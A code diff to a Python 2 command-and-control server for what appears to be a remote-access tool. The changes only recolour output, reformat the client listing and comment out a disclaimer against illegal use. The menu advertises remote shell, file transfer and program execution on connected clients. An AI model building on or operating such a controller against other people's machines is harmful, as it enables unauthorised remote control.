@@ -22,7 +22,7 @@ class SvrMethod():
         self.i = 0
 
     def hello(self, id, ver, info):
-        print id, 'is online.'
+        print (Fore.RED + id +' is online.')
         self.tsk.hello(id, ver, info)
         self.tsk.new_cmd()
 
@@ -83,6 +83,7 @@ class SvrTask(threading.Thread):
         }
         self.cur_cid = None
         #SQLite objects created in a thread can only be used in that same thread.The object was created in thread id 34828 and this is thread id 8960
+        # 连接db
         self.db = SvrDb("svr.db")
         self.cmd_dir = None
         self.pre_cmd_tip = 'cmd >'
@@ -143,11 +144,22 @@ class SvrTask(threading.Thread):
         self.check_client(True)
         c = self.db.list_client()
         if c:
-            title = ('id', 'client_id', 'version', 'localip', 'remoteip', 'username', 'osversion', 'firsttime', 'lasttime', 'status')
-            fmt = '%-6s | %-26s | %-8s | %-20s | %-20s | %-20s | %-10s | %-20s | %-20s | %-6s'
-            print fmt % title
+            format_msg = '''
+==========================
+|id              %-30s
+|client_id       %-30s
+|version         %-30s
+|localip         %-30s
+|remoteip        %-30s
+|username        %-30s
+|osversion       %-30s
+|firsttime       %-30s
+|lasttime        %-30s
+|status          %-30s
+==========================
+                        '''
             for ci in c:
-                print fmt % ci
+                print format_msg % ci
         else:
             print 'no client'
 
@@ -155,11 +167,22 @@ class SvrTask(threading.Thread):
         self.check_client(True)
         c = self.db.list_alive_client()
         if c:
-            title = ('id', 'client_id', 'version', 'localip', 'remoteip', 'username', 'osversion', 'firsttime', 'lasttime', 'status')
-            fmt = '%-6s | %-26s | %-8s | %-20s | %-20s | %-20s | %-10s | %-20s | %-20s | %-6s'
-            print fmt % title
+            format_msg = '''
+==========================
+|id              %-30s
+|client_id       %-30s
+|version         %-30s
+|localip         %-30s
+|remoteip        %-30s
+|username        %-30s
+|osversion       %-30s
+|firsttime       %-30s
+|lasttime        %-30s
+|status          %-30s
+==========================
+            '''
             for ci in c:
-                print fmt % ci
+                print format_msg % ci
         else:
             print 'no alive client'
 
@@ -372,7 +395,7 @@ if __name__ == '__main__':
     print '--------------------anhkgg---------------------------'
     print '--------------------Copyright (c) 2018---------------'
     print ''
-    print Fore.RED+'软件仅供技术交流，请勿用于商业及非法用途，如产生法律纠纷与本人无关!'.decode('utf8')+Fore.RESET
+    # print Fore.RED+'软件仅供技术交流，请勿用于商业及非法用途，如产生法律纠纷与本人无关!'.decode('utf8')+Fore.RESET
     print ''
     print '--------------------Task command---------------------'
     print '--|(l)ist (a)live (k)ill (s)elect (p)rint (c)mdshell (n)ew (d)ownload (r)unexec (u)pload (t)erminate (q)uit (h)elp|--'
